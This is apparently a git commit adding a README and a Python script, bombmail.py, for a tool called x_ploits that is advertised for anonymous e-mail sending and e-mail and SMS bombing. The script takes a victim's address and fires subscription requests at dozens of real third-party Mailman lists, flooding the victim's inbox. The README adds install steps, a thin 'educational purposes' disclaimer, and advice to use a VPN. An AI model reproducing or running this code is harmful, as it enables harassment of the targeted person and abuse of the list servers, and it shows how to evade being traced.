26981ab111f092f08077386a92ef282a547cca2f
brijesh kumar <59088458+anonymousmani@users.noreply.github.com>
2020-04-03 12:52:59 +0530

    Add files via upload

---
+++ README.md
@@ -0,0 +1,75 @@
+<h1 align="center">x_ploits
+
+</h1>
+<p align="center">An open-source Anonymous E-Mail Sender And E-Mail Bombing tool.</p><br>
+
+
+###############  Coded by      : anonymousmani ##############<br>
+########### Inspired by        : tuhin bose ##############<br>
+##############  Instagram id   : www.instagram.com/X_ploits ##############<br>
+##############  Github         : www.github.com/anonymousmani ##############<br>
+
+# By Changing the name, You won't be a script developer...
+
+## Note:
+
+- The script requires working network connection to work.
+- While running this script, a vpn must be used for option 1 &2.
+- This script is only for educational purposes.
+- **Developer is not responsible for the misuse of x_ploits.**
+<br>
+
+## Features:
+
+- Anonymous E-Mail sending.
+- E-Mail bombing without logging in.
+- Sms bombing by victim no.
+- Easy to use.
+
+## Usage:
+
+Run these commands to run x_ploits
+
+### > For Termux:
+
+**Notice:** 
+
+git installation methods are not universal and do differ between distributions,
+so, installing git as per instructions below may not work.
+Please check out how to install `git` for your Linux distribution.
+Commands below provide instructions for Debian-based systems.
+
+To use the scanner type the following commands in Termux:
+```
+pkg install git
+pkg install python2
+git clone https://github.com/anonymousmani/x_ploits.git
+cd x_ploits
+pip2 install -r requirements.txt
+python2 xploits.py
+```
+
+### > For Linux:
+
+**Notice:** 
+
+To use the scanner type the following commands in Linux terminal:
+```
+git clone https://github.com/anonymousmani/x_ploits.git
+cd x_ploits
+pip install -r requirements.txt
+python2 xploits.py
+```
+
+
+
+# CONTACT ME:
+
+Feel Free To Open An Issue...
+
+```
+                 Instagram id: @x_ploits
+      ]
+```
+
+
---
+++ bombmail.py
@@ -0,0 +1,45 @@
+import os
+import requests
+import time
+import random
+import sys
+def banner():
+ os.system("clear")
+ os.system("toilet -fmono12 -F gay X_PLOITS")
+ print("    \033[1;36;40m Code made by: \033[1;32;40m anonymousmani")
+ print("    \033[1;36;40m Inspired by : \033[1;32;40m tuhin bose")
+ print("    \033[1;36;40m Instagram id: \033[1;32;40m www.instagram.com/x_ploits")
+ print("    \033[1;36;40m Github      : \033[1;32;40m www.github.com/anonymousmani")
+ print("    \033[1;31;40m    Use a VPN before running options [1] & [2].Otherwise it won't work")
+ print("\n\n")
+banner() 
+spam_id = str(raw_input("\033[1;33;40mEnter the e-mail address of victim:"))
+count= int(input("\033[1;33;40mEnter the number of e-mails to be sent(Maximum:34): "))
+if(count>34):
+ print("\033[1;31;40mYour entered number is >34 .Quiting...")
+ time.sleep(1.5)
+ sys.exit()
+urllist=["http://list.webaim.org/mailman/subscribe/webaim-forum?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://lists.drupal.org/mailman/subscribe/security-internals?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://lists.drupal.org/mailman/subscribe/security-news?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://coral.aoml.noaa.gov/mailman/subscribe/cdhc?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&email-button=Subscribe","http://coral.aoml.noaa.gov/mailman/subscribe/coral-list?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&email-button=Subscribe","http://audifans.com/mailman/subscribe/es2?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://audifans.com/mailman/subscribe/offtopic?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://audifans.com/mailman/subscribe/marketplace?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://audifans.com/mailman/subscribe/events?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://audifans.com/mailman/subscribe/staff?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://audifans.com/mailman/subscribe/tt?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://audifans.com/mailman/subscribe/torsen?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://place.org/cgi-bin/mailman/subscribe/tjs?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe","http://audifans.com/mailman/subscribe/vwdiesel?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://audifans.com/mailman/subscribe/v6-12v?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://audifans.com/mailman/subscribe/v8?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://audifans.com/mailman/subscribe/urq?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://place.org/cgi-bin/mailman/subscribe/av-games?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe","http://place.org/cgi-bin/mailman/subscribe/sundaynightgames?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe","http://place.org/cgi-bin/mailman/subscribe/tjs-web?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe","http://list.healthnet.org/mailman/subscribe/india-drug?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://lists.vmware.com/mailman/subscribe/te-stacey?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe","http://lists.vmware.com/mailman/subscribe/springsource-announce?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe","http://lists.vmware.com/mailman/subscribe/vmwaretest?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe","http://lists.vmware.com/mailman/subscribe/security-announce?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe","http://lists.vmware.com/mailman/subscribe/solutionproviderroundtable?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe","http://list.healthnet.org/mailman/subscribe/pronut-hiv?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://audifans.com/mailman/subscribe/quattro?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://place.org/cgi-bin/mailman/subscribe/jugglefest-announce?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe","http://place.org/cgi-bin/mailman/subscribe/aow?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe","http://lists.vmware.com/mailman/subscribe/te-contributors?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe","http://lists.vmware.com/mailman/subscribe/te-contributors?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe","http://lists.vmware.com/mailman/subscribe/te-webmaster?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe","http://lists.vmware.com/mailman/subscribe/fusion-enterprise?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe"]
+
+for var in range (0,count):
+ url=urllist[var]
+ requests.get(url)
+ print("\033[1;32;40m")
+ print (var+1)," E-mail sent successfully."
+ time.sleep(3)
+banner()
+
+ 
+
+
+
+
+
+
+
+
+
+
+
+
+
